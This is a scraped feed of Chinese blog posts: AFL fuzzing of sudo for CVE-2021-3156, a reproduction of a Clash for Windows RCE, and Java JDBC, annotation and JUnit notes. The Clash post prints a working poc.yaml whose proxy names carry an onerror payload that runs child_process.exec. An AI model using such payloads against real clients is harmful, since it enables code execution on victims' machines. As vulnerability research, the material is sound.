在最开始的复现博客中，我最初打算在docker中搭建整个项目，但是由于在docker上exp需要微调和学业压力导致我并不能花太多时间在上面，所以我直接使用的虚拟机。不过在原始的备份文档中我依然保存了当时搭建docker的记录，这里和原作者使用的方法类似. Docker LiveOverflow在项目的git仓库中有了这个dockerfile文件。因为中国GFW，所以我换了下源，如果不需要可以删掉。我这里用的是windows的DesktopDocker搭建 ep1\\Dockerfile 12345678910111213FROM ubuntu:20.04ENV LC_CTYPE C.UTF-8ARG DEBIAN_FRONTEND=noninteractiveRUN sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list &amp;&amp;\\ apt-get update &amp;&amp; \\ apt-get install -yq gcc make wget curl git vim gdb clang llvm python3 python3-pip bsdmainutilsRUN cd /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; cd sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installRUN cd /root/ &amp;&amp; git clone https://github.com/google/AFL &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; cd llvm_mode &amp;&amp; make &amp;&amp; cd .. &amp;&amp; make installRUN useradd -ms /bin/bash userRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;31m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# &quot;&#x27; &gt;&gt; /root/.bashrcRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]$ &quot;&#x27; &gt;&gt; /home/user/.bashrcUSER userWORKDIR /home/user 从 ubuntu20.04 的基础镜像中，设置编码为 ENV LC_CTYPE C.UTF-8，设置非交互式操作(ARG DEBIAN_FRONTEND=noninteractive)，升级源并安装必要的编译运行环境，之后下载有漏洞的 sudoedit 源代码编译安装。 之后在该docker中安装 AFL(American Fuzzy Lop) 的模糊测试软件，添加普通用户 user，最后修改命令提示符的界面美化一下并设置工作目录 你可以使用docker build . -t sudo1来创建docker，但是同时作者编写了一个makefile来方便管理 12345678910111213141516171819.PHONY : all stop build run attach rootall : stop build runstop: -docker stop sudo1 sleep 1 -docker rmi sudo1build: docker build --no-cache -t sudo1 .run: docker run --rm -v $(CURDIR):/pwd --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -d --name sudo1 -i sudo1attach: docker exec -it sudo1 /bin/bashroot: docker exec -u root -it sudo1 /bin/bash 在make run的时候设置了-v $(CURDIR):/pwd参数可以让该目录下的文件同样位于在docker中的/pwd中，但是由于我使用的是DesktopDocker+VsCode(Docker plugin)，对我来说不是很必要 所以可以make或者make build来创建docker &gt;&gt;遇到的问题 ERROR [4/8] RUN cd /root/ &amp;&amp; git clone https://github.com/google/AFL &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; make install 中国大陆网络屏蔽了github，导致其无法git仓库，可以挂代理，或者在docker创建好过后再利用pwd文件夹放入afl docker搭建时间长 正常现象，更新下载的时间有点长，这取决于网速 创建容器make run 创建完成后使用make attach进入docker AFL 项目链接：https://lcamtuf.coredump.cx/afl/ American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact synthesized corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road. 编译安装AFL 这里我是去掉git afl的，所以后来要装上 问题：权限不够 以docker exec -it -u root ContainerID /bin/bash进入，然后编译安装afl就行了 开始FUZZ AFL编译sudo AFL的测试是以白盒测试为基础的，我们要使用AFL的编译器对代码进行重新编译；虽然黑盒也行，但是要依靠插桩和qemu 进入sudo文件夹 123CC=afl-gcc ./configure --disable-sharedmake cleanmake -j8 出现图中afl-as之类的提示字符，说明正在使用afl编译 AFL进行分析与fuzz AFL的分析方式有两种 输入为文件 1afl-fuzz -i input_cases -o output_cases -- ./app.bin @@ @@就代表我们的输入示例 输入为stdin输入流 1afl-fuzz -i input_cases -o output_cases -- ./app.bin 但是这里我们的是使用sudo参数处理的字符串 原作者通过搜索afl fuzz argv发现了在AFL的experimental实验性质文件夹中的argv-fuzz-inl.h头文件，具有以下描述 所以我们找到sudo main函数的文件，并且将argv-fuzz-inl.h复制到同一个文件夹下，然后在main函数附近添加AFL_INIT_ARGV()函数 AFL_INIT_ARGV()的原理 可以看原来的头文件： 1#define AFL_INIT_ARGV() do &#123; argv = afl_init_argv(&amp;argc); &#125; while (0) afl_init_argv 123456789101112131415161718192021222324static char** afl_init_argv(int* argc) &#123; static char in_buf[MAX_CMDLINE_LEN]; static char* ret[MAX_CMDLINE_PAR]; char* ptr = in_buf; int rc = 1; /* start after argv[0] */ if (read(0, in_buf, MAX_CMDLINE_LEN - 2) &lt; 0); while (*ptr) &#123; ret[rc] = ptr; /* insert &#x27;\\0&#x27; at the end of ret[rc] on first space-sym */ while (*ptr &amp;&amp; !isspace(*ptr)) ptr++; *ptr = &#x27;\\0&#x27;; ptr++; /* skip more space-syms */ while (*ptr &amp;&amp; isspace(*ptr)) ptr++; rc++; &#125; *argc = rc; return ret;&#125; 本质上该函数就是一个宏定义，将原始的argv替换为afl_init_argv，从而能被后续的fuzzer所分析 afl_init_argv流程 输入流in_buf开始读取 指针不为NULL和空格一直读取 出现空格或NULL置结尾为NULL， 若为空格，参数数目rc+1 最后返回ret，让ret代替了原来的argv，同时argc被改写为rc 重编译sudo 12CC=afl-gcc ./configure --disable-sharedmake clean &amp;&amp; make -j8 这里就直接略过afl的测试了，因为肯定会崩溃 AFL是如何工作的 这里开始是第二节的内容了。 我们的主要目标是fuzz出sudo存在的CVE-2021-3156漏洞，然后完成exp的编写，所以并不会细致的讲解fuzz的具体工作原理和过程。不过fuzz主要有以下几个过程： 预处理 分析和获取有用信息，使用PIN，符号执行，污点检查 黑盒白盒 输入构建 从数据 SSS（种子）产生大量变异数据 III。 输入选择 过滤无效数据，优化模糊测试 评估 大多数关于模糊的研究集中在两个指标上：覆盖率和利用漏洞的平均时间 关于上一节的报错 这里就体现了互联网的艺术：https://milek7.pl/howlongsudofuzz/，这篇文章遇到了相同的问题他的解决方案是： 将afl-gcc编译器替换为基于LLVM的afl-clang编译 For some reason afl-gcc instrumentation didn’t work, so I used LLVM-based one. We just need to override CC for ./configure: 1CC=afl-clang-fast ./configure Clang是个啥？ 了解过编译原理的人，或者编写恶意代码的人对这个一定很熟悉 The Clang project provides a language front-end and tooling infrastructure for languages in the C language family (C, C++, Objective C/C++, OpenCL, CUDA, and RenderScript) for the LLVM project. Both a GCC-compatible compiler driver (clang) and an MSVC-compatible compiler driver (clang-cl.exe) are provided. You can get and build the source today. 编译器的结构 简单理解的话就是说Clang是gcc编译器的另外一个实现 同时AFL也支持使用afl-clang，和afl-gcc的用法相同 The clang wrappers (afl-clang and afl-clang++) can be used in the same way; clang users may also opt to leverage a higher-performance instrumentation mode, as described in llvm_mode/README.llvm. 这就涉及到afl-clang-fast的安装了 解决上一节的报错 安装afl-clang和afl-clang++ 安装clang和llvm（dockerfile中已经提前装好了） 1sudo apt-get install llvm clang 进入编译安装afl-clang和afl-clang++ 1234cd llvm_modemakecd ..make install 重编译sudo 1CC=afl-clang-fast ./configure --disable-shared &amp;&amp; make -j8 这里我发现其实在user用户下也会Segmentation fault，这个是因为权限的问题，后面就大致能感受出来了 开始Fuzz 创建输入输出 123mkdir ../input ../outputecho -en &quot;-l\\x00&quot; &gt; ../input/testcase1afl-fuzz -i ../input/ -o ../output/ -- ./src/sudo AFL的说明 AFL是以基于覆盖率测试的模糊测试工具，将编译过的数据送到被测试的程序中。被测试的程序中有使用AFL编译器编译时的插桩代码(__afl_maybe_log)，可以让编译器返回那些函数被执行过（被覆盖到） 例如在windows的模糊测试中，可以使用DynamoRIO对文件进行覆盖率测试 12D:\\HackTools\\Fuzz\\winafl\\build_x64\\bin\\Release&gt;D:\\HackTools\\Fuzz\\DynamoRIO-Windows-8.0.0-1\\bin64\\drrun.exe -t drcov -- test.exe not_kitty.bmpError 1 然后再IDA中加载覆盖率文件 其中绿色的就是单次执行被覆盖到的代码，被覆盖到的代码越多，测试也就越准确。 所以AFL可以通过插桩代码，不断改进输入的数据，从而得到更高的覆盖率 会得到漏洞吗？ 不会的，在前文中已经写过了 sudoedit就是一个链接到sudo的文件 但是我们是尝试独立挖掘出这个漏洞，并且 sudoedit 是作为独立插件编译得，所以我们并不能直接的测试sudoedit -s 在测试前了解你要测试的程序 123man sudowhereis sudowhereis sudoedit &gt;&gt;问题 This system has been minimized by removing packages and content that are not required on a system that users do not log into.To restore this content, including manpages, you can run the ‘unminimize’ command. You will still need to ensure the ‘man-db’ package is installed. 解决方法和造成原因在这儿：https://github.com/docker/for-linux/issues/639#issuecomment-478765756 直接输入unminimize，这会花很长的时间，真的很长 新的思路 细心一点可能会发现在之前的 123456789101112131415161718192021222324static char** afl_init_argv(int* argc) &#123; static char in_buf[MAX_CMDLINE_LEN]; static char* ret[MAX_CMDLINE_PAR]; char* ptr = in_buf; int rc = 1; /* start after argv[0] */ if (read(0, in_buf, MAX_CMDLINE_LEN - 2) &lt; 0); while (*ptr) &#123; ret[rc] = ptr; /* insert &#x27;\\0&#x27; at the end of ret[rc] on first space-sym */ while (*ptr &amp;&amp; !isspace(*ptr)) ptr++; *ptr = &#x27;\\0&#x27;; ptr++; /* skip more space-syms */ while (*ptr &amp;&amp; isspace(*ptr)) ptr++; rc++; &#125; *argc = rc; return ret;&#125; 其中rc=1，说明是从argv[1]开始创建fake_argv的，但是我们知道argv[0]就是程序自身，那么我们就可以通过fuzz argv[0]从而找到sudoedit。那么修改试试看，重新编译sudo &gt;&gt;问题 为什么没有变化 改的是同级目录下的argv-fuzz-inl.h文件 **为什么都一样？**问题的解决同样在这里：https://milek7.pl/howlongsudofuzz/ Quick test shows that sudo/sudoedit selection doesn’t work correctly from testcases passed in stdin, because for some reason it uses __progname. sudo/sudoedit不会直接使用argv[0]作为程序名称，而是使用__progname 阅读sudo源代码我们发现 在main中 参数数目&gt;0，传递argv[0]，否则使用sudo作为参数 在ep1\\sudo-1.8.31p2\\lib\\util\\progname.c: init_progname中 定义了HAVE___PROGNAME，那么在编译时如果__progname不存在，才会用argv[0]做成程序名 （因为vscode认为是windwos环境，所以这里是灰色的） 解决：直接删掉后重新编译 开始多核fuzz -M 选定主fuzz的单元（Master） 1afl-fuzz -M master -i /tmp/in -o /tmp/out/ -- ./src/sudo -S 选定为从属fuzz单元（Slave） 1afl-fuzz -S slave -i /tmp/in -o /tmp/out/ -- ./src/sudo","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"【漏洞复现】clash <v0.19.8 rce","slug":"clash-rce","date":"2022-04-10T05:32:40.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2022/04/10/clash-rce/","link":"","permalink":"https://joe1sn.eu.org/2022/04/10/clash-rce/","excerpt":"影响版本 Windows v0.19.9版本以下","text":"影响版本 Windows v0.19.9版本以下 漏洞复现 漏洞程序连接： https://github.com/Fndroid/clash_for_windows_pkg/releases poc.yaml 123456789101112131415161718192021222324port: 7890socks-port: 7891allow-lan: truemode: Rulelog-level: infoexternal-controller: :9090proxies: - name: a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; type: socks5 server: 127.0.0.1 port: &quot;17938&quot; skip-cert-verify: true - name: abc type: socks5 server: 127.0.0.1 port: &quot;8088&quot; skip-cert-verify: trueproxy-groups: - name: &lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; type: select proxies: - a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; 在Profiles里面import导入poc后，激活 之后启用节点(Proxies) 相关日志 漏洞分析 1.使用PoC进行分析 看PoC的写法是不是特别像XSS，因为偶Clash For Windows采用electron编写，使用asar 安装asar 1npm install -g asar 解包 1asar e app.asar app_name 对其进行解包后： 原作者对render采用了一定的混淆，虽然变量名混淆对分析造成了极大的干扰，但是最大的麻烦还是一行的js代码，这里可以使用 https://beautifier.io/ 反混淆，替换掉原有的renderer.js文件 打包 1asar pack app_name app.asar 之后使用Debugtron进行调试，找到前端相关的代码 下个断点一步步看吧 这里就已经触发漏洞了 最终发现漏洞代码 renderer.js在加载配置文件的时候，创造元素并加载时并没有对元素进行检查或转义，从而导致XSS 然后XSS中，利用 img 元素的报错处理实现RCE 2.版本对比分析 其实后续分析时，尤其是作者已经修复漏洞的时候最应该使用这个方法。 这样我们就不用一步步的调试了，但是这里采用了混淆也是不好分析。 下载已修复版本，我这里使用的是 Clash.for.Windows-0.19.9-win，测了下确实没有洞 继续使用degtron进行调试 这里的尖括号被替换了，应该就是更新了过滤法则，直接转义成字符串了 挖掘思路 根据上面的分析，怀疑是漏洞挖掘者通过测试.yaml配置文件测试出来的xss，进一步导致rce 引用 http://www.yongsheng.site/2022/02/28/clash for windows rce/ https://github.com/electron/asar https://github.com/bytedance/debugtron","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://joe1sn.eu.org/tags/cve/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"【漏洞复现】CVE-2022-22965 Spring4Shell复现与调试","slug":"spring4shell","date":"2022-04-01T03:05:20.000Z","updated":"2023-08-25T03:27:02.731Z","comments":true,"path":"2022/04/01/spring4shell/","link":"","permalink":"https://joe1sn.eu.org/2022/04/01/spring4shell/","excerpt":"wayback没有镜像，自己备份的md找不到了，只有PDF存档","text":"wayback没有镜像，自己备份的md找不到了，只有PDF存档 https://joe1sn.top/spring4shell.pdf","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"spring","slug":"spring","permalink":"https://joe1sn.eu.org/tags/spring/"}]},{"title":"JavaWeb笔记-JDBC","slug":"java-day3-JDBC","date":"2022-03-19T11:49:07.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2022/03/19/java-day3-JDBC/","link":"","permalink":"https://joe1sn.eu.org/2022/03/19/java-day3-JDBC/","excerpt":"基本概念 快速入门 对JDBC中各个接口和类详解","text":"基本概念 快速入门 对JDBC中各个接口和类详解 JDBC概念 **概念：**Java DataBase Connectivity ，Java数据库连接 本质（类似Django的ORM）:The sun公司定义的一套操作所有关系型数据库的规则（接口）。各个厂家根据接口去实现。我们可以是有这套接口编程，真正的驱动时jar包中的实现类 快速入门 简单步骤 导入驱动jar包 注册驱动 数据库连接对象Connection 定义sql 获取执行SQL语句的Statement对象 执行sql，接受返回结果 处理结果 释放资源 简单使用 123456789101112131415161718192021222324252627282930package learn.jdbc;import java.sql.Connection;import java.sql.DriverManager;import java.sql.Statement;/*JDBC快速入门 */public class JdbcDemo1 &#123; public static void main(String[] args) throws Exception &#123; //1.导入驱动jar包 //2.注册驱动 Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //3.获取数据库连接对象 Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/javaweb&quot;,&quot;root&quot;,&quot;J8L 7T&quot;); //4.定义sql语句 String sql = &quot;update user set UID=00000 where XH=302&quot;; //5.获取执行sql对象 Statement statement = conn.createStatement(); //6.执行sql方法 int count = statement.executeUpdate(sql); //7.处理结果 System.out.println(count); //8.释放资源 statement.close(); conn.close(); &#125;&#125; 步骤详解 DriverManager：驱动管理对象 注册驱动 注册与给定的驱动程序 DriverManager 1static void registerDriver(Driver driver) 写代码使用 1Class.forName(&quot;com.mysql.jdbc.Driver&quot;); 为静态代码使用 12345package com.mysql.cj.jdbc;public class Driver extends com.mysql.cj.jdbc.NonRegisteringDriver implements java.sql.Driver &#123; public Driver() throws java.sql.SQLException &#123; /* compiled code */ &#125;&#125; mysql5.0以上可以不用注册驱动 获取数据库连接 尝试建立与给定数据库URL的连接。 1static Connection getConnection(String url, String user, String password) url：jdbc:mysql://ip:port/database 默认为本地sql地址及默认端口 Connection：数据库连接对象 获取执行sql对象 1Statement createStatement() 1PreparedStatement prepareStatement(String sql) 管理事务 开启事务：参数为false即开启事务 1void setAutoCommit(boolean autoCommit) 提交事务 1void commit() 回滚事务 1void rollback() Statement：执行sql对象 执行任意sql 1boolean execute(String sql) 执行DML DDL语句，返回影响的行数 1int executeUpdate(String sql) 1ResultSet executeQuery(String sql) ResultSet：结果集对象 PreparedStatement：执行sql对象 JDBC工具类：JDBCUtils 目的：简化书写 分析： 注册驱动也抽取 抽取一个方法获取连接对象 抽取方法释放资源 抽取连接对象 1 close释放资源重载 123456789101112131415161718192021222324252627282930313233343536373839404142public static void close(Statement stmt, Connection conn)&#123; if(stmt != conn)&#123; try &#123; stmt.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125;//释放方法2public static void close(ResultSet rs, Statement stmt, Connection conn)&#123; if (rs != conn)&#123; try&#123; rs.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(stmt != conn)&#123; try &#123; stmt.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-数据库","slug":"java-d2-database","date":"2022-03-18T08:26:12.000Z","updated":"2023-06-01T14:23:04.393Z","comments":true,"path":"2022/03/18/java-d2-database/","link":"","permalink":"https://joe1sn.eu.org/2022/03/18/java-d2-database/","excerpt":"","text":"SQL分类 数据查询语言（DQL） 数据查询语言（Data Query Language, DQL）是SQL语言中，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句。保留字SELECT是DQL（也是所有SQL）用得最多的动词，其他DQL常用的保留字有FROM，WHERE，GROUP BY，HAVING和ORDER BY。这些DQL保留字常与其他类型的SQL语句一起使用。 数据定义语言（DDL）(CRUD) 数据定义语言 (Data Definition Language, DDL) 是SQL语言集中，负责数据结构定义与数据库对象定义的语言，由CREATE、ALTER与DROP三个语法所组成，最早是由 Codasyl (Conference on Data Systems Languages) 数据模型开始，现在被纳入 SQL 指令中作为其中一个子集。 数据操纵语言（DML） 数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DELETE三种指令为核心，分别代表插入、更新与删除。 数据控制语言（DCL） 数据控制语言 (Data Control Language) 在SQL语言中，是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。由 GRANT 和 REVOKE 两个指令组成。DCL以控制用户的访问权限为主，GRANT为授权语句，对应的REVOKE是撤销授权语句。 指针控制语言（CCL） 它的语句，像DECLARE CURSOR，FETCH INTO和UPDATE WHERE CURRENT用于对一个或多个表单独行的操作。 事务处理语言（TPL） 它的语句能确保被DML语句影响的表的所有行及时得以更新。TPL语句包括BEGIN TRANSACTION，COMMIT和ROLLBACK。","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-注解","slug":"java-d1-annotation","date":"2022-03-16T12:49:29.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2022/03/16/java-d1-annotation/","link":"","permalink":"https://joe1sn.eu.org/2022/03/16/java-d1-annotation/","excerpt":"注释部分","text":"注释部分 注解 概念：说明程序。For计算机 从JDK1.5开始，Java增加对元数据的支持，也就是注解，注解与注释是有一定区别的，可以把注解理解为代码里的特殊标记，这些标记可以在编译，类加载，运行时被读取，并执行相应的处理。通过注解开发人员可以在不改变原有代码和逻辑的情况下在源代码中嵌入补充信息。 注释：用文字描述程序。For程序员 作用 编写文档：标识生成doc文档 1234567891011121314package LearnJunit.annotation;/** * 注解 java doc演示 * @since 1.5 * @author joe1sn * @version 1.0 */public class AnnoDemo1 &#123; //计算两数之和 public int add(int a, int b)&#123; return a+b; &#125;&#125; javadoc AnnoDemo1.java -encoding UTF-8 -charset UTF-8 123456789101112131415161718正在加载源文件AnnoDemo1.java...正在构造 Javadoc 信息...标准 Doclet 版本 1.8.0_301正在构建所有程序包和类的树...正在生成.\\AnnoDemo1.html...正在生成.\\package-frame.html...正在生成.\\package-summary.html...正在生成.\\package-tree.html...正在生成.\\constant-values.html...正在构建所有程序包和类的索引...正在生成.\\overview-tree.html...正在生成.\\index-all.html...正在生成.\\deprecated-list.html...正在构建所有类的索引...正在生成.\\allclasses-frame.html...正在生成.\\allclasses-noframe.html...正在生成.\\index.html...正在生成.\\help-doc.html... 代码检查：代码分析（使用反射） 例子： @Override 也可以自定义注解【使用反射】 让编译器实现基本的检查 JDK预定义注解 @Override 编译检查，检查被标记方法是否是被父类覆写的方法 @Deprecated 该注解内容已过时 @SuppressWarnings 压制警告，需要传参，一般传递&quot;all&quot;压制所有警告 自定义注解及使用(解析) 格式 1234@Target(ElementType.METHOD)@Retention(RetentionPolicy.SOURCE)public @interface Override &#123;&#125; 1234元注解public @interface 注解名称&#123; 属性列表&#125; 本质：注解本质上就是一个接口，接口默认继承Annotation() 12public interface MyAnno extends java.lang.annotation.Annotation &#123;&#125; 属性：接口中可以定义的成员方法 要求： 属性返回类型 基本数据类型 String 枚举 注解 以上类型数组 1234567public @interface MyAnno &#123; int show1(); String show2(); Person per(); //枚举 MyAnno2 anno2();//注解 String[] strs();//字符串数组&#125; 定义的属性在使用时需要给属性赋值 缺少赋值： 只留下show1进行赋值 默认赋值 1234public @interface MyAnno &#123; int age(); String name() default &quot;Doe&quot;;&#125; 如果只有一个属性需要赋值，如果属性名称是value，直接赋值 123456package LearnJunit.annotation;@MyAnno(1)public class Worker &#123;&#125; 对于枚举、注解、字符串的注解 12345678@MyAnno(age=1, per=Person.P1, anno2=@MyAnno2,// strs=&#123;&quot;1&quot;,&quot;a&quot;,&quot;v&quot;&#125; strs = &quot;abcdefg&quot;)public class Worker &#123;&#125; 元注解：用于描述注解的注解 @Target：描述注解能够作用的位置 ElementType取值： TYPE：作用于类上 METHOD：作用于方法上 FIELD：作用于成员变量上 12345678//表示anno3注解只能作用于类上@Target(value = &#123; ElementType.TYPE, ElementType.METHOD, ElementType.FIELD&#125;)public @interface MyAnno3 &#123;&#125; @Retention：描述注解能被保留的阶段 RetentionPolicy：判断在哪个阶段，使用该注解 SOURCE CLASS RUNTIME（一般使用这个）：会保留到class字节码文件中，并被JVM读取到 @Documented：描述注解是否被抽取到api文档中 123456@MyAnno3public class Worker &#123; public String name = &quot;John&quot;; @MyAnno3 public void show()&#123;&#125;;&#125; 1234567891011121314151617181920/** * - @Target：描述注解能够作用的位置 - @Retention：描述注解能被保留的阶段 - @Documented：描述注解是否被抽取到api文档中 - @Inherited：描述注解是否这子类继承 */import java.lang.annotation.*;//表示anno3注解只能作用于类上@Target(value = &#123; ElementType.TYPE, ElementType.METHOD, ElementType.FIELD&#125;)@Documented@Retention(RetentionPolicy.RUNTIME)public @interface MyAnno3 &#123;&#125; 删除该注解后 @Inherited：描述注解是否被子类继承 解析注解 将配置文件的工作交给注解完成 123456789/** * 描述需要执行的类名和方法名 */@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface Pro &#123; String className(); String method();&#125; 1234567891011121314151617181920212223242526package LearnJunit.annotation;import LearnJunit.reflect.ReflectDemo1;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Properties;//假设框架类@Pro(className = &quot;LearnJunit.annotation.Demo1&quot;, method = &quot;show&quot;)public class ReflectFramework &#123; public static void main(String[] args) throws Exception &#123; //1.解析注解 // 获取该类的字节码文件对象 Class&lt;ReflectFramework&gt; reflectFrameworkClass = ReflectFramework.class; //2.获得注解对象 // 内存中生成了该注解接口的 子类实现对象 Pro an = reflectFrameworkClass.getAnnotation(Pro.class); //3.调用注解对象中定义的抽象方法，获取返回值 String className = an.className(); &#125;&#125; 关于步骤2，在 21行下个断点 这个时候注解相关的都还没有对应数据，但是获得了注解(.getAnnotation)对象后 不仅reflectFrameworkClass注解有了值，而且在内存中多出了一个an变量，而an就是我们注解的内容 最后加上 1234567//4.反射获得类Class aClass = Class.forName(className);//5.获得类的方法Method aMethod = aClass.getMethod(methodName);//6.调用方法Object aObject = aClass.newInstance();aMethod.invoke(aObject); 就能使用注解中的类的对应方法了 案例 测试类 LearnJunit.annotation.demo.Calculator 123456789101112131415161718192021222324252627package LearnJunit.annotation.demo;public class Calculator &#123; @check public void add() &#123; System.out.println(&quot;1 + 0 = &quot; + (1 + 0)); &#125; @check public void sub() &#123; System.out.println(&quot;1 - 0 = &quot; + (1 - 0)); &#125; @check public void mul() &#123; System.out.println(&quot;1 * 0 = &quot; + (1 * 0)); &#125; @check public void div() &#123; System.out.println(&quot;1 / 0 = &quot; + (1 / 0)); &#125; public void show()&#123; System.out.println(&quot;always normal&quot;); &#125;&#125; 测试注解 LearnJunit.annotation.demo.check 1234567891011package LearnJunit.annotation.demo;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)public @interface check &#123;&#125; 测试方法 LearnJunit.annotation.demo.testCheck 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package LearnJunit.annotation.demo;import java.io.BufferedWriter;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.Method;/** * 简单测试框架 * 挡住方法执行后，自动执行被检测的所有方法 */public class testCheck &#123; public static void main(String[] args) throws IOException &#123; //1.创建被测试对象 Calculator calculator = new Calculator(); //2.得到所有带注解的函数 int e_num = 0;//出现异常的次数 BufferedWriter bw = new BufferedWriter(new FileWriter(&quot;bug.txt&quot;));//创建文件对象 //2.1得到所有函数 Method[] methods = calculator.getClass().getMethods(); for (Method method:methods)&#123; //2.2检测是否带注解 if(method.isAnnotationPresent(check.class))&#123; //2.3若带注解则执行 try &#123; method.invoke(calculator); &#125; catch(Exception e)&#123; //2.3.1捕获异常 e.printStackTrace(); //2.3.2记录到文件 e_num++; bw.write(&quot;+++++&quot;+method.getName()+&quot; 方法异常&quot;); bw.newLine(); bw.write(&quot;异常名称&gt;&gt; &quot;+e.getCause().getClass().getSimpleName()); bw.newLine(); bw.write(&quot;异常原因&gt;&gt;&quot;+e.getCause().getMessage()); bw.newLine(); &#125; &#125; &#125; bw.write(&quot;本次测试一共出现 &quot;+e_num+&quot; 次异常&quot;); bw.newLine(); bw.flush(); bw.close(); &#125;&#125; 小结 大多数时候使用注解而不是自定义注解 注解给谁用： 编译器 解析程序（checkTest） 注解不是程序的一部分（相当于C的编译参数，如预编译命令）","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-Junit与反射","slug":"java-d1-Junit","date":"2022-03-15T23:27:53.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2022/03/16/java-d1-Junit/","link":"","permalink":"https://joe1sn.eu.org/2022/03/16/java-d1-Junit/","excerpt":"Junit单元测试与反射 黑盒-白盒","text":"Junit单元测试与反射 黑盒-白盒 junit使用：白盒测试 步骤： 定义一个测试类 测试类名：被测试类+Test CalculatorTest 包名：xxx.xxx.xxx.test 定义测试方法：可以独立执行，建议 方法名：test测试方法名 testAdd() 返回值：void（独立运行） 参数列表：空参 方法+@test注解 导入Junit依赖环境 1234567891011121314151617package test;import junit.Calculator;import org.junit.Test;public class CalculatorTest &#123; //测试add方法 @Test public void testAdd()&#123; //System.out.printf(&quot;Excuted&quot;); //创建计算器对象 Calculator c = new Calculator(); //2.调用add方法 int result = c.add(1,2); System.out.println(result); &#125;&#125; 123456789101112package junit;//计算器public class Calculator &#123; //加法 public int add(int a, int b)&#123; return a+b; &#125; //减法 public int sub(int a, int b)&#123; return a-b; &#125;&#125; 在add添加除0异常 12345678910111213package junit;//计算器public class Calculator &#123; //加法 public int add(int a, int b)&#123; int i = 3/0; return a+b; &#125; //减法 public int sub(int a, int b)&#123; return a-b; &#125;&#125; 假设原方法中add写成了-，使用断言报错 1234567891011121314151617181920package test;import junit.Calculator;import org.junit.Assert;import org.junit.Test;public class CalculatorTest &#123; //测试add方法 @Test public void 